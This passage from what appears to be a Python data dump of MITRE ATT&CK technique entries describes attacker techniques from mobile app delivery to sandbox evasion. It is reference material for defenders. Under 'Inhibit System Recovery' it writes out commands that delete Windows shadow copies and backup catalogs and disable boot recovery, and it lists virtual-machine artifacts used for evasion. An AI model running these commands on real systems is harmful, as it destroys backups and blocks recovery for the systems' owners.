                          'mobile devices. This technique describes installing a malicious application on targeted '
                          'mobile devices without involving an authorized app store (e.g., Google Play Store or Apple '
                          'App Store). Adversaries may wish to avoid placing malicious applications in an authorized '
                          'app store due to increased potential risk of detection or other reasons. However, mobile '
                          'devices often are configured to allow application installation only from an authorized app '
                          'store which would prevent this technique from working.\n'
                          '\n'
                          'Delivery methods for the malicious application include:\n'
                          '\n'
                          '* [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) - Including the '
                          'mobile app package as an attachment to an email message.\n'
                          '* [Spearphishing Link](https://attack.mitre.org/techniques/T1192) - Including a link to the '
                          'mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, '
                          'etc.), web site, QR code, or other means.\n'
                          '* Third-Party App Store - Installed from a third-party app store (as opposed to an '
                          'authorized app store that the device implicitly trusts as part of its default behavior), '
                          'which may not apply the same level of scrutiny to apps as applied by an authorized app '
                          'store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: '
                          'TrendMicro-FlappyBird)\n'
                          '\n'
                          'Some Android malware comes with functionality to install additional applications, either '
                          'automatically or when the adversary instructs it to.(Citation: '
                          'android-trojan-steals-paypal-2fa)',
           'name': 'Deliver Malicious App via Other Means',
           'platforms': ['Android', 'iOS']},
 'T1477': {'attack_id': 'T1477',
           'categories': ['initial-access'],
           'description': 'The mobile device may be targeted for exploitation through its interface to cellular '
                          'networks or other radio interfaces.\n'
                          '\n'
                          '### Baseband Vulnerability Exploitation\n'
                          '\n'
                          'A message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, '
                          'NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) or other) to the mobile device could exploit '
                          'a vulnerability in code running on the device(Citation: Register-BaseStation)(Citation: '
                          'Weinmann-Baseband).\n'
                          '\n'
                          '### Malicious SMS Message\n'
                          '\n'
                          'An SMS message could contain content designed to exploit vulnerabilities in the SMS parser '
                          'on the receiving device(Citation: Forbes-iPhoneSMS). An SMS message could also contain a '
                          'link to a web site containing malicious content designed to exploit the device web browser. '
                          'Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages(Citation: '
                          'SRLabs-SIMCard).',
           'name': 'Exploit via Radio Interfaces',
           'platforms': ['Android', 'iOS']},
 'T1478': {'attack_id': 'T1478',
           'categories': ['defense-evasion', 'initial-access'],
           'description': 'An adversary could attempt to install insecure or malicious configuration settings on the '
                          'mobile device, through means such as phishing emails or text messages either directly '
                          'containing the configuration settings as an attachment, or containing a web link to the '
                          'configuration settings. The device user may be tricked into installing the configuration '
                          'settings through social engineering techniques (Citation: Symantec-iOSProfile).\n'
                          '\n'
                          'For example, an unwanted Certification Authority (CA) certificate could be placed in the '
                          "device's trusted certificate store, increasing the device's susceptibility to "
                          "man-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's "
                          'network communication ([Eavesdrop on Insecure Network '
                          'Communication](https://attack.mitre.org/techniques/T1439) and [Manipulate Device '
                          'Communication](https://attack.mitre.org/techniques/T1463)).\n'
                          '\n'
                          'On iOS, malicious Configuration Profiles could contain unwanted Certification Authority '
                          '(CA) certificates or other insecure settings such as unwanted proxy server or VPN settings '
                          "to route the device's network traffic through an adversary's system. The device could also "
                          'potentially be enrolled into a malicious Mobile Device Management (MDM) system (Citation: '
                          'Talos-MDM).',
           'name': 'Install Insecure or Malicious Configuration',
           'platforms': ['Android', 'iOS']},
 'T1480': {'attack_id': 'T1480',
           'categories': ['defense-evasion'],
           'description': 'Execution guardrails constrain execution or actions based on adversary supplied environment '
                          'specific conditions that are expected to be present on the target. \n'
                          '\n'
                          'Guardrails ensure that a payload only executes against an intended target and reduces '
                          'collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) '
                          'Values an adversary can provide about a target system or environment to use as guardrails '
                          'may include specific network share names, attached physical devices, files, joined Active '
                          'Directory (AD) domains, and local/external IP addresses.\n'
                          '\n'
                          'Environmental keying is one type of guardrail that includes cryptographic techniques for '
                          'deriving encryption/decryption keys from specific types of values in a given computing '
                          'environment.(Citation: EK Clueless Agents) Values can be derived from target-specific '
                          'elements and used to generate a decryption key for an encrypted payload. Target-specific '
                          'values can be derived from specific network shares, physical devices, software/software '
                          'versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: '
                          'Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding '
                          'Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By '
                          'generating the decryption keys from target-specific environmental values, environmental '
                          'keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and '
                          'reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: '
                          'Genetic Malware) These difficulties can slow down the incident response process and help '
                          'adversaries hide their tactics, techniques, and procedures (TTPs).\n'
                          '\n'
                          'Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), '
                          'adversaries may use guardrails and environmental keying to help protect their TTPs and '
                          'evade detection. For example, environmental keying may be used to deliver an encrypted '
                          'payload to the target that will use target-specific values to decrypt the payload before '
                          'execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware '
                          'Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: '
                          'Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload '
                          'the adversary can avoid packaging the decryption key with the payload or sending it over a '
                          'potentially monitored network connection. Depending on the technique for gathering '
                          'target-specific values, reverse engineering of the encrypted payload can be exceptionally '
                          'difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to '
                          'prevent exposure of capabilities in environments that are not intended to be compromised or '
                          'operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox '
                          'Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to '
                          'further engage because the value conditions specified by the adversary are meant to be '
                          'target specific and not such that they could occur in any environment.',
           'name': 'Execution Guardrails',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1481': {'attack_id': 'T1481',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use an existing, legitimate external Web service as a means for relaying '
                          'commands to a compromised system.\n'
                          '\n'
                          'These commands may also include pointers to command and control (C2) infrastructure. '
                          'Adversaries may post content, known as a dead drop resolver, on Web services with embedded '
                          '(and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach '
                          'out to and be redirected by these resolvers.\n'
                          '\n'
                          'Popular websites and social media acting as a mechanism for C2 may give a significant '
                          'amount of cover due to the likelihood that hosts within a network are already communicating '
                          'with them prior to a compromise. Using common services, such as those offered by Google or '
                          'Twitter, makes it easier for adversaries to hide in expected noise. Web service providers '
                          'commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n'
                          '\n'
                          'Use of Web services may also protect back-end C2 infrastructure from discovery through '
                          'malware binary analysis while also enabling operational resiliency (since this '
                          'infrastructure may be dynamically changed).',
           'name': 'Web Service',
           'platforms': ['Android', 'iOS']},
 'T1482': {'attack_id': 'T1482',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to gather information on domain trust relationships that may be '
                          'used to identify [Lateral Movement](https://attack.mitre.org/tactics/TA0008) opportunities '
                          'in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain '
                          'to allow access to resources based on the authentication procedures of another '
                          'domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to '
                          'access resources in the trusting domain. The information discovered may help the adversary '
                          'conduct [SID-History Injection](https://attack.mitre.org/techniques/T1178), [Pass the '
                          'Ticket](https://attack.mitre.org/techniques/T1097), and '
                          '[Kerberoasting](https://attack.mitre.org/techniques/T1208).(Citation: AdSecurity Forging '
                          'Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the '
                          'DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain '
                          'Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to '
                          'be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation '
                          'Wilysupply)',
           'name': 'Domain Trust Discovery',
           'platforms': ['Windows']},
 'T1483': {'attack_id': 'T1483',
           'categories': ['command-and-control'],
           'description': 'Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a '
                          'destination for command and control traffic rather than relying on a list of static IP '
                          'addresses or domains. This has the advantage of making it much harder for defenders block, '
                          'track, or take over the command and control channel, as there potentially could be '
                          'thousands of domains that malware can check for instructions.(Citation: Cybereason '
                          'Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n'
                          '\n'
                          'DGAs can take the form of apparently random or “gibberish” strings (ex: '
                          'istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. '
                          'Alternatively, some DGAs employ whole words as the unit by concatenating words together '
                          'instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different '
                          'domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value '
                          'as well to make predicting future domains more difficult for defenders.(Citation: '
                          'Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup '
                          '2017)(Citation: Akamai DGA Mitigation)\n'
                          '\n'
                          'Adversaries may use DGAs for the purpose of [Fallback '
                          'Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary '
                          'command and control server malware may employ a DGA as a means to reestablishing command '
                          'and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: '
                          'ESET Sednit 2017 Activity)',
           'name': 'Domain Generation Algorithms',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1484': {'attack_id': 'T1484',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary '
                          'access controls for a domain, usually with the intention of escalating privileges on the '
                          'domain. \n'
                          '\n'
                          'Group policy allows for centralized management of user and computer settings in Active '
                          'Directory (AD). GPOs are containers for group policy settings made up of files stored '
                          'within a predicable network path '
                          '<code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet '
                          'Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n'
                          '\n'
                          'Like other objects in AD, GPOs have access controls associated with them. By default all '
                          'user accounts in the domain have permission to read GPOs. It is possible to delegate GPO '
                          'access control permissions, e.g. write access, to specific users or groups in the domain.\n'
                          '\n'
                          'Malicious GPO modifications can be used to implement [Scheduled '
                          'Task](https://attack.mitre.org/techniques/T1053), [Disabling Security '
                          'Tools](https://attack.mitre.org/techniques/T1089), [Remote File '
                          'Copy](https://attack.mitre.org/techniques/T1105), [Create '
                          'Account](https://attack.mitre.org/techniques/T1136), [Service '
                          'Execution](https://attack.mitre.org/techniques/T1035) and more.(Citation: ADSecurity GPO '
                          'Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO '
                          'Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) '
                          'Since GPOs can control so many user and machine settings in the AD environment, there are a '
                          'great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide '
                          'to GPOs) Publicly available scripts such as <code>New-GPOImmediateTask</code> can be '
                          'leveraged to automate the creation of a malicious [Scheduled '
                          'Task](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case '
                          'modifying '
                          '<code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: '
                          'Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary '
                          'might modify specific user rights like SeEnableDelegationPrivilege, set in '
                          '<code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to '
                          'achieve a subtle AD backdoor with complete control of the domain because the user account '
                          "under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y "
                          'SeEnableDelegationPrivilege Right)\n',
           'name': 'Group Policy Modification',
           'platforms': ['Windows']},
 'T1485': {'attack_id': 'T1485',
           'categories': ['impact'],
           'description': 'Adversaries may destroy data and files on specific systems or in large numbers on a network '
                          'to interrupt availability to systems, services, and network resources. Data destruction is '
                          'likely to render stored data irrecoverable by forensic techniques through overwriting files '
                          'or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye '
                          'Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill '
                          '2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common '
                          'operating system file deletion commands such as <code>del</code> and <code>rm</code> often '
                          'only remove pointers to files without wiping the contents of the files themselves, making '
                          'the files recoverable by proper forensic methodology. This behavior is distinct from [Disk '
                          'Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure '
                          'Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed '
                          "rather than sections of a storage disk or the disk's logical structure.\n"
                          '\n'
                          'Adversaries may attempt to overwrite files and directories with randomly generated data to '
                          'make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 '
                          '2018) In some cases politically oriented image files have been used to overwrite '
                          'data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)\n'
                          '\n'
                          'To maximize impact on the target organization in operations where network-wide availability '
                          'interruption is the goal, malware designed for destroying data may have worm-like features '
                          'to propagate across a network by leveraging additional techniques like [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon '
                          '2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)',
           'name': 'Data Destruction',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1486': {'attack_id': 'T1486',
           'categories': ['impact'],
           'description': 'Adversaries may encrypt data on target systems or on large numbers of systems in a network '
                          'to interrupt availability to system and network resources. They can attempt to render '
                          'stored data inaccessible by encrypting files or data on local and remote drives and '
                          'withholding access to a decryption key. This may be done in order to extract monetary '
                          'compensation from a victim in exchange for decryption or a decryption key (ransomware) or '
                          'to render data permanently inaccessible in cases where the key is not saved or '
                          'transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: '
                          'US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is '
                          'typical that common user files like Office documents, PDFs, images, videos, audio, text, '
                          'and source code files will be encrypted. In some cases, adversaries may encrypt critical '
                          'system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\n'
                          '\n'
                          'To maximize impact on the target organization, malware designed for encrypting data may '
                          'have worm-like features to propagate across a network by leveraging other attack techniques '
                          'like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: FireEye WannaCry '
                          '2017)(Citation: US-CERT NotPetya 2017)',
           'name': 'Data Encrypted for Impact',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1487': {'attack_id': 'T1487',
           'categories': ['impact'],
           'description': 'Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot '
                          'systems; targeting specific critical systems as well as a large number of systems in a '
                          'network to interrupt availability to system and network resources. \n'
                          '\n'
                          'Adversaries may attempt to render the system unable to boot by overwriting critical data '
                          'located in structures such as the master boot record (MBR) or partition table.(Citation: '
                          'Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov '
                          '2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data '
                          'contained in disk structures may include the initial executable code for loading an '
                          'operating system or the location of the file system partitions on disk. If this information '
                          'is not present, the computer will not be able to load an operating system during the boot '
                          'process, leaving the computer unavailable. [Disk Structure '
                          'Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along '
                          'with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a '
                          'disk are wiped.\n'
                          '\n'
                          'To maximize impact on the target organization, malware designed for destroying disk '
                          'structures may have worm-like features to propagate across a network by leveraging other '
                          'techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon '
                          '2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)',
           'name': 'Disk Structure Wipe',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1488': {'attack_id': 'T1488',
           'categories': ['impact'],
           'description': 'Adversaries may erase the contents of storage devices on specific systems as well as large '
                          'numbers of systems in a network to interrupt availability to system and network resources.\n'
                          '\n'
                          'Adversaries may partially or completely overwrite the contents of a storage device '
                          'rendering the data irrecoverable through the storage interface.(Citation: Novetta '
                          'Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony '
                          '2018) Instead of wiping specific disk structures or files, adversaries with destructive '
                          'intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may '
                          'acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of '
                          'disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have '
                          'been observed leveraging third-party drivers like '
                          '[RawDisk](https://attack.mitre.org/software/S0364) to directly access disk '
                          'content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) '
                          'This behavior is distinct from [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased '
                          'instead of individual files.\n'
                          '\n'
                          'To maximize impact on the target organization in operations where network-wide availability '
                          'interruption is the goal, malware used for wiping disk content may have worm-like features '
                          'to propagate across a network by leveraging additional techniques like [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster '
                          'Destructive Malware)',
           'name': 'Disk Content Wipe',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1489': {'attack_id': 'T1489',
           'categories': ['impact'],
           'description': 'Adversaries may stop or disable services on a system to render those services unavailable '
                          'to legitimate users. Stopping critical services can inhibit or stop response to an incident '
                          "or aid in the adversary's overall objectives to cause damage to the environment.(Citation: "
                          'Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n'
                          '\n'
                          'Adversaries may accomplish this by disabling individual services of high importance to an '
                          'organization, such as <code>MSExchangeIS</code>, which will make Exchange content '
                          'inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or '
                          'disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer '
                          '2018) Services may not allow for modification of their data stores while running. '
                          'Adversaries may stop services in order to conduct [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for '
                          'Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like '
                          'Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)',
           'name': 'Service Stop',
           'platforms': ['Windows']},
 'T1490': {'attack_id': 'T1490',
           'categories': ['impact'],
           'description': 'Adversaries may delete or remove built-in operating system data and turn off services '
                          'designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos '
                          'Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain '
                          'features that can help fix corrupted systems, such as a backup catalog, volume shadow '
                          'copies, and automatic repair features. Adversaries may disable or delete system recovery '
                          'features to augment the effects of [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for '
                          'Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer '
                          '2018)(Citation: FireEye WannaCry 2017)\n'
                          '\n'
                          'A number of native Windows utilities have been used by adversaries to disable or delete '
                          'system recovery features:\n'
                          '\n'
                          '* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - '
                          '<code>vssadmin.exe delete shadows /all /quiet</code>\n'
                          '* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be '
                          'used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n'
                          '* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - '
                          '<code>wbadmin.exe delete catalog -quiet</code>\n'
                          '* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by '
                          'modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy '
                          'ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>',
           'name': 'Inhibit System Recovery',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1491': {'attack_id': 'T1491',
           'categories': ['impact'],
           'description': 'Adversaries may modify visual content available internally or externally to an enterprise '
                          'network. Reasons for Defacement include delivering messaging, intimidation, or claiming '
                          '(possibly false) credit for an intrusion. \n'
                          '\n'
                          '### Internal\n'
                          'An adversary may deface systems internal to an organization in an attempt to intimidate or '
                          'mislead users. This may take the form of modifications to internal websites, or directly to '
                          'user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) '
                          'Disturbing or offensive images may be used as a part of Defacement in order to cause user '
                          'discomfort, or to pressure compliance with accompanying messages. While internally defacing '
                          "systems exposes an adversary's presence, it often takes place after other intrusion goals "
                          'have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)\n'
                          '\n'
                          '### External \n'
                          'Websites are a common victim of defacement; often targeted by adversary and hacktivist '
                          'groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber '
                          'Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on '
                          'Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) Defacement may be used '
                          'as a catalyst to trigger events, or as a response to actions taken by an organization or '
                          'government. Similarly, website defacement may also be used as setup, or a precursor, for '
                          'future attacks such as [Drive-by '
                          'Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive '
                          'Into Defacement)\n',
           'name': 'Defacement',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1492': {'attack_id': 'T1492',
           'categories': ['impact'],
           'description': 'Adversaries may insert, delete, or manipulate data at rest in order to manipulate external '
                          'outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony '
                          '2018) By manipulating stored data, adversaries may attempt to affect a business process, '
                          'organizational understanding, and decision making. \n'
                          '\n'
                          'Stored data could include a variety of file formats, such as Office files, databases, '
                          'stored emails, and custom file formats. The type of modification and the impact it will '
                          'have depends on the type of data as well as the goals and objectives of the adversary. For '
                          'complex systems, an adversary would likely need special expertise and possibly access to '
                          'specialized software related to the system that would typically be gained through a '
                          'prolonged information gathering campaign in order to have the desired impact.',
           'name': 'Stored Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1493': {'attack_id': 'T1493',
           'categories': ['impact'],
           'description': 'Adversaries may alter data en route to storage or other systems in order to manipulate '
                          'external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus '
                          'Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business '
                          'process, organizational understanding, and decision making. \n'
                          '\n'
                          'Manipulation may be possible over a network connection or between system processes where '
                          'there is an opportunity deploy a tool that will intercept and change information. The type '
                          'of modification and the impact it will have depends on the target transmission mechanism as '
                          'well as the goals and objectives of the adversary. For complex systems, an adversary would '
                          'likely need special expertise and possibly access to specialized software related to the '
                          'system that would typically be gained through a prolonged information gathering campaign in '
                          'order to have the desired impact.',
           'name': 'Transmitted Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1494': {'attack_id': 'T1494',
           'categories': ['impact'],
           'description': 'Adversaries may modify systems in order to manipulate the data as it is accessed and '
                          'displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony '
                          '2018) By manipulating runtime data, adversaries may attempt to affect a business process, '
                          'organizational understanding, and decision making. \n'
                          '\n'
                          'Adversaries may alter application binaries used to display data in order to cause runtime '
                          'manipulations. Adversaries may also conduct [Change Default File '
                          'Association](https://attack.mitre.org/techniques/T1042) and '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The '
                          'type of modification and the impact it will have depends on the target application and '
                          'process as well as the goals and objectives of the adversary. For complex systems, an '
                          'adversary would likely need special expertise and possibly access to specialized software '
                          'related to the system that would typically be gained through a prolonged information '
                          'gathering campaign in order to have the desired impact.',
           'name': 'Runtime Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1495': {'attack_id': 'T1495',
           'categories': ['impact'],
           'description': 'Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other '
                          'firmware in devices attached to a system in order to render them inoperable or unable to '
                          'boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and '
                          'executed from non-volatile memory on hardware devices in order to initialize and manage '
                          'device functionality. These devices could include the motherboard, hard drive, or video '
                          'cards.',
           'name': 'Firmware Corruption',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1496': {'attack_id': 'T1496',
           'categories': ['impact'],
           'description': 'Adversaries may leverage the resources of co-opted systems in order to solve resource '
                          'intensive problems which may impact system and/or hosted service availability. \n'
                          '\n'
                          'One common purpose for Resource Hijacking is to validate transactions of cryptocurrency '
                          'networks and earn virtual currency. Adversaries may consume enough system resources to '
                          'negatively impact and/or cause affected machines to become unresponsive.(Citation: '
                          'Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - '
                          'Unused AWS Regions) systems are common targets because of the high potential for available '
                          'resources, but user endpoint systems may also be compromised and used for Resource '
                          'Hijacking and cryptocurrency mining.',
           'name': 'Resource Hijacking',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1497': {'attack_id': 'T1497',
           'categories': ['defense-evasion', 'discovery'],
           'description': 'Adversaries may check for the presence of a virtual machine environment (VME) or sandbox to '
                          'avoid potential detection of tools and activities. If the adversary detects a VME, they may '
                          'alter their malware to conceal the core functions of the implant or disengage from the '
                          'victim. They may also search for VME artifacts before dropping secondary or additional '
                          'payloads. Adversaries may use the information from learned from [Virtualization/Sandbox '
                          'Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape '
                          'follow-on behaviors.\n'
                          '\n'
                          'Adversaries may use several methods including [Security Software '
                          'Discovery](https://attack.mitre.org/techniques/T1063) to accomplish [Virtualization/Sandbox '
                          'Evasion](https://attack.mitre.org/techniques/T1497) by searching for security monitoring '
                          'tools (e.g., Sysinternals, Wireshark, etc.) to help determine if it is an analysis '
                          'environment. Additional methods include use of sleep timers or loops within malware code to '
                          'avoid operating within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n'
                          '\n'
                          '###Virtual Machine Environment Artifacts Discovery###\n'
                          '\n'
                          'Adversaries may use utilities such as [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047), '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), '
                          '[Systeminfo](https://attack.mitre.org/software/S0096), and the [Query '
                          'Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and '
                          'search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, '
                          'file system, and/or the Registry. Adversaries may use '
                          '[Scripting](https://attack.mitre.org/techniques/T1064) to combine these checks into one '
                          'script and then have the program exit if it determines the system to be a virtual '
                          'environment. Also, in applications like VMWare, adversaries can use a special I/O port to '
                          'send commands and receive output. Adversaries may also check the drive size. For example, '
                          'this can be done using the Win32 DeviceIOControl function. \n'
                          '\n'
                          'Example VME Artifacts in the Registry(Citation: McAfee Virtual Jan 2017)\n'
                          '\n'
                          '* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</code>\n'
                          '* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n'
                          '* <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n'
                          '\n'
                          'Example VME files and DLLs on the system(Citation: McAfee Virtual Jan 2017)\n'
                          '\n'
                          '* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code> \n'
                          '* <code>WINDOWS\\system32\\vboxhook.dll</code>\n'
                          '* <code>Windows\\system32\\vboxdisp.dll</code>\n'
                          '\n'
                          'Common checks may enumerate services running that are unique to these applications, '
                          'installed programs on the system, manufacturer/product fields for strings relating to '
                          'virtual machine applications, and VME-specific hardware/processor instructions.(Citation: '
                          'McAfee Virtual Jan 2017)\n'
                          '\n'
                          '###User Activity Discovery###\n'
                          '\n'
                          'Adversaries may search for user activity on the host (e.g., browser history, cache, '
                          'bookmarks, number of files in the home directories, etc.) for reassurance of an authentic '
                          'environment. They might detect this type of information via user interaction and digital '
                          'signatures. They may have malware check the speed and frequency of mouse clicks to '
                          'determine if it’s a sandboxed environment.(Citation: Sans Virtual Jan 2016) Other methods '
                          'may rely on specific user interaction with the system before the malicious code is '
                          'activated. Examples include waiting for a document to close before activating a macro '
                          '(Citation: Unit 42 Sofacy Nov 2018) and waiting for a user to double click on an embedded '
                          'image to activate (Citation: FireEye FIN7 April 2017).\n'
                          '\n'
                          '###Virtual Hardware Fingerprinting Discovery###\n'
                          '\n'
                          'Adversaries may check the fan and temperature of the system to gather evidence that can be '
                          'indicative a virtual environment. An adversary may perform a CPU check using a WMI query '
